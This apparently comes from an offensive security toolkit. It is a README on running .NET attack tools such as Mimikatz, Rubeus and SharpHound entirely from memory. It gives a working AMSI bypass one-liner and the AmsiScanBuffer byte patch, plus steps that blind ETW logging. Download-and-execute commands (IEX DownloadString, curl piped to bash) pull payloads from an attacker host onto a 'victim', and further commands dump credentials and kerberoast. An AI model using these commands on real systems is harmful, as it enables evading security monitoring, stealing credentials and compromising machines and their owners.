# Reflective Tool Loading

Run .NET tools (Mimikatz, SharpHound, Seatbelt, Rubeus, etc.) entirely from memory — no binary ever touches disk.

---

## The Core Concept

Windows .NET runtime allows loading assemblies from raw byte arrays:
```csharp
Assembly a = Assembly.Load(bytes);
a.EntryPoint.Invoke(null, new object[] { args });
```
PowerShell exposes this as `[System.Reflection.Assembly]::Load($bytes)`.

**The attack chain**: fetch bytes from URL → load into current process → execute. AV never sees a file. No new process is spawned.

---

## Files in this directory

| File | Purpose | Use case |
|------|---------|---------|
| `Load-Assembly.ps1` | Simple PS wrapper for Assembly.Load | Quick in-memory execution, no encryption needed |
| `Invoke-SharpEncrypt.ps1` | AES+GZip+Base64 encryptor | Prep a .NET tool for encrypted transport |
| `Invoke-SharpLoader.ps1` | AES+GZip loader + built-in AMSI bypass + ETW patch | Production: load encrypted tools from URL |

---

## Tool 1: Simple Loader (Load-Assembly.ps1)

Use when the tool won't trigger AMSI (e.g. custom tools, already-obfuscated builds).

```powershell
# Bypass AMSI first (always)
(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)

# Load and run
. .\Load-Assembly.ps1
Load-AssemblyFromURL -Url "http://192.168.45.202/Seatbelt.exe" -Args @("-group=all")

# Or one-liner:
$b=(New-Object System.Net.WebClient).DownloadData("http://192.168.45.202/tool.exe")
[System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,@()))
```

---

## Tool 2: Encrypted Pipeline (Invoke-SharpEncrypt + Invoke-SharpLoader)

Use for heavily-signatured tools like Mimikatz, SharpHound.

### Step 1 — Kali: encrypt the binary

```powershell
# On Kali (PowerShell)
. ./Invoke-SharpEncrypt.ps1
Invoke-SharpEncrypt -file mimikatz.exe -password "MyStrongPass123" -outfile mimikatz.enc
```

This produces `mimikatz.enc` — a Base64 string containing GZip-compressed, AES-256-encrypted bytes. Serve it from your web server.

```bash
# Serve the encrypted file
python3 -m http.server 80
```

### Step 2 — Victim: decrypt and execute in memory

```powershell
# On victim (run from a PS session or via your existing loader)
IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.202/Invoke-SharpLoader.ps1')
Invoke-SharpLoader -location "http://192.168.45.202/mimikatz.enc" -password "MyStrongPass123" -argument "coffee"
```

SharpLoader automatically:
1. Patches `AmsiScanBuffer` to return AMSI_RESULT_CLEAN
2. Patches ETW (`EtwEventWrite`) to blind event tracing
3. Downloads the encrypted file
4. Base64-decodes → GZip-decompresses → AES-256-decrypts in memory
5. Loads the assembly with `Assembly.Load()`
6. Calls `EntryPoint.Invoke()`

---

## Common tool invocations

```powershell
# Mimikatz — dump credentials
Invoke-SharpLoader -location "http://KALI/mimi.enc" -password "pass" -argument "sekurlsa::logonpasswords" -argument2 "exit"

# SharpHound — AD enumeration
Invoke-SharpLoader -location "http://KALI/sharp.enc" -password "pass" -argument "-c" -argument2 "All" -argument3 "--zipfilename loot.zip"

# Rubeus — kerberoast
Invoke-SharpLoader -location "http://KALI/rubeus.enc" -password "pass" -argument "kerberoast" -argument2 "/nowrap"

# Seatbelt — situational awareness
Invoke-SharpLoader -location "http://KALI/seatbelt.enc" -password "pass" -argument "-group=all"

# SharpUp — privesc checks
Invoke-SharpLoader -location "http://KALI/sharpup.enc" -password "pass" -argument "audit"

# No-args tools
Invoke-SharpLoader -location "http://KALI/tool.enc" -password "pass" -noArgs
```

---

## How Invoke-SharpLoader AMSI patch works

The embedded C# patches `AmsiScanBuffer` with:
```
x64: 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3  → MOV EAX, 0x80070057; RET
x86: 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00
```
`0x80070057` is `E_INVALIDARG` — forces AMSI to return "clean" for everything.

The ETW patch (Invoke-BlockETW) loads a compiled binary via `Assembly.Load()` that patches `ntdll!EtwEventWrite` to return immediately — blinding event logging for the session.

---

## WinPEAS / LinPEAS (special case)

These are PE executables, not .NET — they won't load via Assembly.Load.

**Windows WinPEAS:**
```powershell
# Run WinPEAS via a PS wrapper (it spawns as a subprocess, not reflective)
$wc = New-Object System.Net.WebClient
$wc.DownloadFile("http://KALI/winPEAS.exe", "C:\Windows\Temp\wp.exe")
C:\Windows\Temp\wp.exe
```
For truly fileless WinPEAS, use a Donut-converted shellcode version (see `04-encoders/donut/`).

**Linux LinPEAS:**
```bash
# Standard approach — no reflective loading needed on Linux
curl -s http://KALI/linpeas.sh | bash

# Or with output capture:
curl -s http://KALI/linpeas.sh -o /tmp/lp.sh && bash /tmp/lp.sh 2>&1 | tee /tmp/lp.out
```

---

## Encryption details (Invoke-SharpEncrypt pipeline)

```
Input binary
    ↓ Prepend 4 random salt bytes
    ↓ AES-256-CBC encrypt (key = SHA256 of password, salt = {1,2,3,4,5,6,7,8})
    ↓ GZip compress
    ↓ Base64 encode
→ .enc file (plaintext base64, safe to serve over HTTP)
```

Decryption in Invoke-SharpLoader reverses: Base64 → GZip decompress → AES decrypt → strip salt → Assembly.Load.
